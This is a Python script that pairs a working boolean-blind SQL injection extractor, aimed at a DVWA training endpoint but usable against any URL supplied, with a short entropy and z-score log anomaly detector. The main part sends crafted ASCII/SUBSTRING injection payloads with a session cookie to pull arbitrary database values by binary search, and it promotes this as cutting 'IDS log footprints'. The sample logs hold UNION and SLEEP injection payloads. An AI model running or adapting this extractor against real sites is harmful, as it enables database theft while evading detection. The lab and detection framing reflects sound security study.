#!/usr/bin/env python3
"""
hung_blind_bisect.py - Custom Binary-Search O(log2 N) Boolean-Blind SQLi Extractor
& Shannon Entropy / Response-Size Z-Score Log Anomaly Detector (IDS).
Demonstrates algorithmic red-team optimization and mathematical blue-team telemetry.
Uses Python 3 standard library only.
"""

from __future__ import annotations

import argparse
import collections
import math
import statistics
import sys
import urllib.parse
import urllib.request
from dataclasses import dataclass


@dataclass
class BisectStep:
    position: int
    low: int
    high: int
    mid: int
    comparison_ok: bool
    probe: str


def shannon_entropy(text: str) -> float:
    """Compute Shannon entropy H(X) in bits per character."""
    if not text:
        return 0.0
    counts = collections.Counter(text)
    length = len(text)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


def oracle_http_probe(
    base_url: str,
    cookie: str,
    expression: str,
    position: int,
    threshold: int,
    true_marker: str = "User ID exists in the database.",
) -> bool:
    """Send single boolean bisect HTTP GET request to DVWA Blind SQLi endpoint."""
    payload = f"1' AND ASCII(SUBSTRING(({expression}),{position},1))>{threshold}#"
    sep = "&" if "?" in base_url else "?"
    full_url = f"{base_url}{sep}id={urllib.parse.quote(payload)}&Submit=Submit"
    req = urllib.request.Request(full_url, headers={"Cookie": cookie})
    with urllib.request.urlopen(req, timeout=5.0) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    return true_marker in body


def extract_with_binary_search(
    expression: str,
    max_len: int = 24,
    demo_secret: str | None = None,
    base_url: str | None = None,
    cookie: str = "",
) -> tuple[str, list[BisectStep], int, int]:
    """
    Extract string character-by-character using O(log2 N) binary search over ASCII [32..126].
    Returns (extracted_text, trace_steps, binary_requests, brute_force_baseline_requests).
    """
    extracted_chars: list[str] = []
    steps: list[BisectStep] = []
    binary_requests = 0

    for pos in range(1, max_len + 1):
        low, high = 32, 126
        if demo_secret is not None:
            char_code = ord(demo_secret[pos - 1]) if pos <= len(demo_secret) else 0
            if char_code == 0:
                binary_requests += 1
                steps.append(
                    BisectStep(
                        pos,
                        0,
                        126,
                        0,
                        False,
                        f"1' AND ASCII(SUBSTRING(({expression}),{pos},1))=0# (EOF)",
                    )
                )
                break
        else:
            # Verify character exists beyond null byte first
            assert base_url is not None
            exists = oracle_http_probe(base_url, cookie, expression, pos, 0)
            binary_requests += 1
            if not exists:
                break
            char_code = -1

        while low < high:
            mid = (low + high) // 2
            probe = f"1' AND ASCII(SUBSTRING(({expression}),{pos},1))>{mid}#"
            if demo_secret is not None:
                is_greater = char_code > mid
            else:
                assert base_url is not None
                is_greater = oracle_http_probe(base_url, cookie, expression, pos, mid)
            binary_requests += 1
            steps.append(BisectStep(pos, low, high, mid, is_greater, probe))
            if is_greater:
                low = mid + 1
            else:
                high = mid

        extracted_chars.append(chr(low))

    text = "".join(extracted_chars)
    # Naive linear search averages ~47 attempts per printable ASCII character
    linear_baseline = max(len(text), 1) * 48
    return text, steps, binary_requests, linear_baseline


SAMPLE_LOG_LINES = [
    ("172.17.0.1", "/vulnerabilities/sqli/?id=1&Submit=Submit", 200, 1842),
    ("172.17.0.1", "/vulnerabilities/sqli/?id=2&Submit=Submit", 200, 1839),
    ("172.17.0.1", "/vulnerabilities/sqli_blind/?id=3&Submit=Submit", 200, 1845),
    ("172.17.0.1", "/vulnerabilities/sqli_blind/?id=1%27+AND+ASCII%28SUBSTRING%28version%28%29%2C1%2C1%29%29%3E79%23&Submit=Submit", 200, 1791),
    ("172.17.0.1", "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit", 200, 4920),
    ("172.17.0.1", "/vulnerabilities/sqli_blind/?id=1%27+OR+IF%281%3D1%2CSLEEP%283%29%2C0%29--+-&Submit=Submit", 200, 1765),
]


def analyze_logs(lines: list[tuple[str, str, int, int]]) -> None:
    """Compute Shannon entropy of query string + Z-score anomaly on response bytes."""
    sizes = [row[3] for row in lines]
    mean_sz = statistics.mean(sizes)
    std_sz = statistics.pstdev(sizes) or 1.0

    print("=== IDS Mathematical Anomaly Detector (Shannon Entropy & Z-Score) ===")
    print(f"Baseline Response Mean={mean_sz:.1f} bytes, StdDev={std_sz:.1f} bytes\n")
    for ip, uri, status, nbytes in lines:
        decoded_uri = urllib.parse.unquote_plus(uri)
        query = decoded_uri.split("?", 1)[1] if "?" in decoded_uri else decoded_uri
        h = shannon_entropy(query)
        z = (nbytes - mean_sz) / std_sz
        alert = h >= 4.2 or abs(z) >= 1.8
        verdict = "ALERT [SQLi Probe]" if alert else "NORMAL"
        print(f"[{verdict:18s}] H={h:.2f} bits | Z={z:+.2f} | HTTP {status} {nbytes}B | {decoded_uri}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Binary-Search O(log2 N) Blind SQLi Extractor & IDS Entropy Detector"
    )
    parser.add_argument("--url", help="Target DVWA Blind SQLi URL (e.g. http://127.0.0.1:8080/vulnerabilities/sqli_blind/)")
    parser.add_argument("--cookie", default="security=low; PHPSESSID=demo", help="Session cookie header")
    parser.add_argument("--query", default="database()", help="SQL expression to extract")
    parser.add_argument("--demo", action="store_true", help="Run deterministic O(log2 N) binary-search trace on 'dvwa'")
    parser.add_argument("--demo-secret", default="dvwa", help="Secret string used with --demo")
    parser.add_argument("--demo-entropy", action="store_true", help="Run Shannon entropy & Z-score log anomaly detector")
    args = parser.parse_args()

    if args.demo_entropy:
        analyze_logs(SAMPLE_LOG_LINES)
        return 0

    if not args.url and not args.demo:
        args.demo = True

    if args.demo:
        extracted, steps, bin_reqs, lin_reqs = extract_with_binary_search(
            args.query, max_len=32, demo_secret=args.demo_secret
        )
    else:
        extracted, steps, bin_reqs, lin_reqs = extract_with_binary_search(
            args.query, max_len=32, base_url=args.url, cookie=args.cookie
        )

    saving_pct = round((1 - (bin_reqs / max(lin_reqs, 1))) * 100, 1)
    print(f"=== Custom O(log2 N) Blind SQLi Binary-Search Tracer ({args.query}) ===")
    for idx, st in enumerate(steps[:20], start=1):
        branch = "TRUE  -> lower = mid+1" if st.comparison_ok else "FALSE -> upper = mid  "
        print(f"Step {idx:02d} [pos={st.position}] range=[{st.low:3d}..{st.high:3d}] mid={st.mid:3d} ('{chr(max(32, st.mid))}') | {branch}")
    if len(steps) > 20:
        print(f"... ({len(steps) - 20} remaining steps omitted)")
    print(f"\nExtracted Value       : {extracted}")
    print(f"Binary Search Requests: {bin_reqs} HTTP requests (~7 req/char)")
    print(f"Linear Brute Baseline : ~{lin_reqs} HTTP requests (~48 avg req/char)")
    print(f"Traffic Reduction     : {saving_pct}% fewer IDS log footprints")
    return 0


if __name__ == "__main__":
    sys.exit(main())
